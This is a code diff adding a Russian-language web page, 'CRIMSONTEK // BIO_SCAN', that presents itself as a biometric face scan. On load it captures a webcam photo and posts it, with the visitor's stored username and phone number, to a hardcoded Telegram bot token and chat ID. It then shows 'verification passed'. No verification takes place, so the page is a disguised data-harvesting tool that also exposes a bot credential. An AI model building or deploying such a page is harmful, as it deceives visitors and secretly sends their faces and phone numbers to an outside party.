@@ -1,11 +1,47 @@
-<script>
-    async function sendToTelegram() {
-        // Твоя логика отправки фото в ТГ...
-        // ... (код отправки) ...
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8"><title>CRIMSONTEK // BIO_SCAN</title>
+    <style>
+        body { background: #000; color: #f00; font-family: monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        video { border: 2px solid #f00; width: 300px; filter: grayscale(1) contrast(1.5); margin-bottom: 20px; }
+        #status { color: #0f0; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <h2>BIOMETRIC_SCAN</h2>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <div id="status">СКАНИРОВАНИЕ ЛИЦА... ОЖИДАЙТЕ</div>
 
-        // ПОСЛЕ УСПЕШНОЙ ОТПРАВКИ:
-        localStorage.setItem('crimson_verified', 'true'); // ПОДТВЕРЖДАЕМ ВХОД
-        alert("БИОМЕТРИЯ ПРОЙДЕНА. ДОСТУП В ХАБ ОТКРЫТ.");
-        window.location.href = 'dashboard.html';
-    }
-</script>
+    <script>
+        const v = document.getElementById('v'), c = document.getElementById('c');
+        const token = "8657121511:AAGfGVnM6YKvaDUGRQ9MwmmNO0P_4IS6gq0";
+        const chatId = "7616949660";
+
+        navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+            v.srcObject = stream;
+            setTimeout(takePhoto, 3000); // Сделает фото через 3 секунды
+        });
+
+        function takePhoto() {
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            c.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'bio.jpg');
+                formData.append('caption', `НОВЫЙ ОПЕРАТОР: ${localStorage.getItem('c_user')}\nТЕЛ: ${localStorage.getItem('crimson_phone') || 'Не указан'}`);
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData })
+                .then(() => {
+                    localStorage.setItem('c_verified', 'true');
+                    sessionStorage.setItem('active', 'true');
+                    document.getElementById('status').innerText = "ВЕРИФИКАЦИЯ ПРОЙДЕНА";
+                    setTimeout(() => { window.location.href = 'dashboard.html'; }, 1000);
+                });
+            }, 'image/jpeg');
+        }
+    </script>
+</body>
+</html>
